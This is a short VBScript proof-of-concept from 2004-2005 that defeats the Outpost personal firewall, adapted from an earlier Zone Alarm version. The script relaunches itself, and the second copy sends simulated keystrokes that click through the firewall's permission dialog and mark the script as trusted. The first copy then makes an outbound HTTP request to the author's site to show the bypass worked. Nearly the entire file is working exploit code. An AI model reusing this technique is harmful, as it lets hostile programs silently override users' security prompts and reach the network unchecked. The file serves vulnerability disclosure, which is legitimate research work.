'***********************************************************
'// By Ferruh Mavituna 
'// ferruh{@}mavituna.com, http://ferruh.mavituna.com
'***********************************************************
'// Date : 4/25/2004
'// Simple POC for Skipping Zone Alarm Firewall with sendKeys and multithreading
'// Related Advisory : NOT PUBLISHED YET
'***********************************************************
'Modified for Agnitium Outpost Firewall 2.1.303.4009 (314)
'Tested : Agnitium Outpost Firewall 2.5.369.4608 (369)
'5/5/2004
'02.01.2005
'Ferruh Mavituna
	'Const DELAY = 1000
	'Const TIMES = 1
	'Const EXTRADELAY = 0

'***********************************************************

Option Explicit

Dim argLen, shell, sendKeyMod, i, appName
Const DELAY = 1000
Const TIMES = 1
Const EXTRADELAY = 0

appName = Wscript.ScriptName

'SendKey
sendkeyMod = False
argLen = WScript.Arguments.Length
If argLen>0 Then sendkeyMod = True 

Set shell = WScript.CreateObject("WScript.Shell")

If sendKeyMod Then
	
	'First Sleep for a while
	If EXTRADELAY>0 Then WScript.Sleep EXTRADELAY

	'Force
	While i<TIMES
		i=i+1
		WScript.Sleep DELAY
		'1) First add it  trusted
		shell.sendKeys "+{TAB}" 'Go back once
		shell.sendKeys "{UP 2}" 'Go Up

		'1) Press Enter
		shell.sendKeys "{ENTER}" 'Enter
	Wend

	'Exit
	'Wscript.Echo "Exit !"
	Wscript.Quit 1
End If

'Wscript.Echo WScript.ScriptFullName
Call shell.Run(appName & " /send")

'Connect
Wscript.Echo connect("http://ferruh.mavituna.com") & "Mission Accomplished..."

Set shell = Nothing
Wscript.Quit 1


Function connect(ByVal URL)
	Dim web
	Set web = CreateObject("Microsoft.XmlHttp")
	web.open "HEAD", URL, FALSE
	web.send ""
	connect = web.getAllResponseHeaders
	Set web = Nothing
End Function